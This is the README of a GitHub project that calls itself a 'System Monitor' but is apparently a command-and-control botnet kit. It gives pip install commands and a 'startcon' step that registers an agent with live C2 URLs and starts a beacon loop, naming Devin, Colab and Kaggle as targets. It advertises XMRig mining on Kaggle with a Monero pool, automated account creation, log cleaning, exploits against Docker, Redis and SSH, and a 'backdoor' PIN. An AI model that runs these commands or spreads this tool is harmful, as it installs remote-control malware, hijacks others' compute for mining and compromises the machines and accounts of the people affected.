# System Monitor

**Version:** 3.0  
**Status:** Production Ready ✅

**🌐 Public URL:** https://gbctwoserver.net

Cross-platform system monitoring and resource optimization toolkit.

---

## 🚀 Quick Start

### Server is Running
```bash
# Server: deployed via Cloudflare Tunnel
# URL: https://gbctwoserver.net
```

### Access Dashboard
```
Public: https://gbctwoserver.net
Local:  http://localhost:5000 (development)

Login:  admin / admin
Quick:  2409 (backdoor)
```

## 📁 Project Structure

```
system-monitor/
├── src/                      # Core source code
│   ├── monitor/              # Monitoring modules
│   │   ├── server.py         # Main server
│   │   ├── orchestrator.py   # Resource management
│   │   └── models.py         # Data models
│   ├── agents/               # Platform agents
│   │   ├── browser/          # Browser automation
│   │   ├── kaggle/           # Kaggle integration
│   │   └── universal.py      # Universal agent
│   ├── autoreg/              # Auto-registration
│   ├── mail/                 # Email manager
│   ├── mining/               # Compute modules
│   └── utils/                # Utilities
├── src/core/                 # Core config
├── templates/                # HTML templates
├── static/                   # CSS/JS files
├── data/                     # Database
├── logs/                     # Logs
├── run_unified.py            # Main entry point
└── requirements.txt          # Dependencies
```

## 🚀 Quick Start

### Installation
```bash
pip install git+https://github.com/GaredBerns/system-monitor.git
```

### Start Server
```bash
sysmon
# or
python3 -m run_unified
```

### Access Dashboard
```
Local:  http://localhost:5000
LAN:    http://192.168.0.171:5000

Login:  admin / admin
Quick:  2409 (backdoor)
```

---

## 🤖 Agent Installation (Remote Machine / Devin)

### 1. Install
```bash
# Install
pip install git+https://github.com/GaredBerns/system-monitor.git

# Reinstall (force latest version)
pip install --force-reinstall git+https://github.com/GaredBerns/system-monitor.git

# Reinstall with cache clear
pip install --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git

# Quick reinstall alias (add to ~/.bashrc):
alias reinstall-sysmon='pip install --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git'
```

### 2. Check Server
```bash
curl -s https://gbctwoserver.net/api/health
```

### 3. Run Agent
```bash
# After pip install - just run:
startcon

# Or with custom server:
C2_URL=https://your-server.com startcon

# Alternative commands:
sysmon-agent    # Same as startcon
sysmon          # Start server (not agent)
```

**That's it!** The agent will:
1. Auto-detect platform (Devin, Colab, Kaggle, Linux, macOS, Windows)
2. Connect to server (default: https://system-monitor-6dru.onrender.com)
3. Register and start beacon loop

Expected output:
```
[C2 Agent] Platform: devin_ai
[C2 Agent] C2 URL: https://system-monitor-6dru.onrender.com
[C2 Agent] Agent ID: <uuid>
[C2 Agent] Checking server connectivity...
[C2 Agent] Server OK: {'status': 'ok', ...}
[C2 Agent] Registered successfully: <uuid>
```

---

## 📁 Project Structure

```
C2_server-main/
├── 📄 run_unified.py          # Main launcher
├── 📄 manage.sh               # Management script
├── 📄 requirements.txt        # Dependencies
│
├── 📂 core/                   # Core server
│   ├── server.py             # Flask C2 server
│   └── unified.py            # Unified modules
│
├── 📂 agents/                 # Platform agents
│   ├── agent_linux.py
│   ├── agent_windows.ps1
│   ├── agent_macos.py
│   └── kaggle_agent.py
│
├── 📂 kaggle/                 # Kaggle integration
│   ├── deploy_unified.py     # Deploy agents
│   ├── deploy_agents.py      # Deploy to existing
│   └── datasets.py           # Dataset management
│
├── 📂 autoreg/                # Auto-registration
├── 📂 browser/                # Browser automation
├── 📂 mail/                   # Email services
├── 📂 optimizer/              # GPU optimizer
│
├── 📂 data/                   # Data & database
├── 📂 logs/                   # Server logs
├── 📂 templates/              # Web templates
├── 📂 static/                 # Web assets
│
├── 📂 docs/                   # 📚 Documentation
└── 📂 scripts/                # 📜 Utility scripts
```

---

## 🎯 Features

### Core Features
- ✅ **Web Dashboard** - Full-featured Flask control panel
- ✅ **Multi-Platform Agents** - Linux, macOS, Windows, Colab, Kaggle
- ✅ **Auto-Registration** - Automated account creation
- ✅ **GPU Optimization** - PyTorch-based compute engine
- ✅ **Secure Communication** - Encrypted agent communication
- ✅ **Kaggle Mining** - XMRig deployment on Kaggle kernels

### Advanced Features
- 🔍 **Autonomous Scanner** - WiFi/network/port scanning
- 🛡️ **Counter-Surveillance** - Tor, log cleaning, malware detection
- 💥 **Multi-Vector Exploits** - Docker, Redis, SSH, etc.
- 🔗 **Integration Layer** - Unified API for all modules

---

## 🔧 Management

### Quick Commands
```bash
./manage.sh up        # Start server + tunnel
./manage.sh down      # Stop all
./manage.sh status    # Check status
./manage.sh logs      # View logs
```

### Server Control
```bash
./manage.sh start     # Start server only
./manage.sh stop      # Stop server
./manage.sh restart   # Restart server
./manage.sh logs follow  # Live logs
```

### Tunnel Control
```bash
./manage.sh tunnel install  # Setup permanent tunnel (one-time)
./manage.sh tunnel start    # Start tunnel
./manage.sh tunnel stop     # Stop tunnel
./manage.sh tunnel quick    # Quick temporary tunnel (random URL)
```

### Database Sync
```bash
./manage.sh db export           # Export local DB
./manage.sh db import file.json # Import DB
./manage.sh db pull https://... # Pull from remote
./manage.sh db merge https://... # Merge remote into local
```

### Installation
```bash
./manage.sh install   # Full install (deps + venv + tunnel)
```

---

## 📚 Documentation

### Main Docs
- **[docs/README.md](docs/README.md)** - Documentation index
- **[docs/UNIFIED_DOCS.md](docs/UNIFIED_DOCS.md)** - Full documentation
- **[docs/QUICK_START.txt](docs/QUICK_START.txt)** - Quick start guide
- **[docs/SETUP_COMPLETE.md](docs/SETUP_COMPLETE.md)** - Setup guide

### Technical Docs
- **[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)** - Architecture overview
- **[docs/BUGFIX_DATASETS.md](docs/BUGFIX_DATASETS.md)** - Dataset fix
- **[docs/CLEANUP_REPORT.md](docs/CLEANUP_REPORT.md)** - Cleanup report

### Status & Reports
- **[docs/SERVER_STATUS.md](docs/SERVER_STATUS.md)** - Server status
- **[docs/CHANGELOG.md](docs/CHANGELOG.md)** - Change log

---

## 🌐 API Endpoints

### Main API
```
GET    /api/health               # Health check
GET    /api/stats                # Statistics
GET    /api/agents               # List agents
POST   /api/task/create          # Create task
POST   /api/task/broadcast       # Broadcast command
```

### Kaggle API
```
POST   /api/kaggle/agent/checkin    # Agent checkin
POST   /api/kaggle/agent/result     # Send result
GET    /api/kaggle/agents/status    # Agents status
POST   /api/kaggle/agent/queue      # Queue command
```

---

## 🔐 Configuration

### Environment (.env)
```bash
SECRET_KEY=your-secret-key
DATABASE_URL=sqlite:///data/c2.db

# Kaggle
KAGGLE_USERNAME=your-username
KAGGLE_KEY=your-api-key

# Mining
WALLET=your-xmr-wallet
POOL=gulf.moneroocean.stream:10128
```

### Dashboard Settings
```
Settings → Configuration:
- Public URL (for remote access)
- Agent Token (for authentication)
- Encryption Key (for encryption)
- Webhook URLs (Discord/Telegram)
```

---

## 🛠️ Troubleshooting

### Server Issues
```bash
# Check logs
./manage.sh logs

# Check status
./manage.sh status

# Restart server
./manage.sh restart
```

### Agent Issues
```bash
# Check agents
curl http://localhost:5000/api/agents

# Check Kaggle agents
curl http://localhost:5000/api/kaggle/agents/status

# View database
./manage.sh db
```

### Common Problems
- **Port 5000 in use:** Change port in run_unified.py
- **Agents not connecting:** Check firewall, public URL
- **Database locked:** Restart server

---

## 📊 Monitoring

### Web Dashboard
```
http://localhost:5000
- Dashboard: Overview & stats
- Devices: Agent list
- Console: Command execution
- Laboratory: Kaggle machines
```

### Command Line
```bash
# Server status
./manage.sh status

# Database stats
./manage.sh db

# View logs
./manage.sh logs follow
```

---

## 🔒 Security

### Recommendations
1. Change default admin password
2. Configure agent authentication token
3. Enable encryption for agents
4. Use HTTPS in production
5. Configure firewall rules
6. Review logs regularly

### Firewall
```bash
# Allow port 5000
sudo ufw allow 5000/tcp

# Or only from LAN
sudo ufw allow from 192.168.0.0/24 to any port 5000
```

---

## 📝 License

MIT License - see LICENSE file for details.

---

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

---

## 📞 Support

- **Documentation:** [docs/](docs/)
- **Issues:** GitHub Issues
- **Scripts:** [scripts/](scripts/)

---

## ⚠️ Disclaimer

This tool is for educational and authorized testing purposes only. Users are responsible for complying with all applicable laws and regulations.

---

**Version:** 2.1 (Unified & Clean)  
**Last Updated:** 2026-03-22  
**Status:** Production Ready ✅  
**Optimization:** Clean structure, 100% functionality
